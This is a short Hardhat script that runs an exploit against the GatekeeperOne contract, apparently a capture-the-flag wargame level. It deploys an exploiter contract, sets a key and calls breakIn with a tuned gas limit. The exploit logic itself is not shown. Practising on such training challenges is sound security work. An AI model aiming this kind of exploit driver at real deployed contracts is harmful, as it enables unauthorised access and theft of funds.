// gatekeeperOne.js - Exploits the GatekeeperOne contract

// Import statements
require("dotenv").config();
const { ethers } = require("hardhat");
const { gkOneAddress, gkOneAbi } = require("../contracts");

async function main() {
    // Get ethers signer and contract instances
    const provider = ethers.provider;
    const gkOne = new ethers.Contract(gkOneAddress, gkOneAbi, provider);

    // // Deploy the GatekeeperOne contract - for testing locally, use provided instance to submit
    // const GKOne = await ethers.getContractFactory("GatekeeperOne");
    // const gkOne = await GKOne.deploy();
    // await gkOne.deployed();
    // console.log("GatekeeperOne deployed to:", gkOne.address);

    // Deploy the Exploiter contract
    const Exploiter = await ethers.getContractFactory("GatekeeperOneExploit");
    const exploiter = await Exploiter.deploy(gkOne.address);
    await exploiter.deployed();
    console.log("Exploiter deployed to:", exploiter.address);

    // Run exploit
    console.log("Running exploit.")

    // Set the key in the exploiter contract
    const setKeyTxn = await exploiter.setKey();
    await setKeyTxn.wait();
    console.log("Key set.");

    // Break into the GatekeeperOne contract
    const breakInTxn = await exploiter.breakIn({gasLimit: 1000219});
    await breakInTxn.wait();

    console.log("Exploit completed.")

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });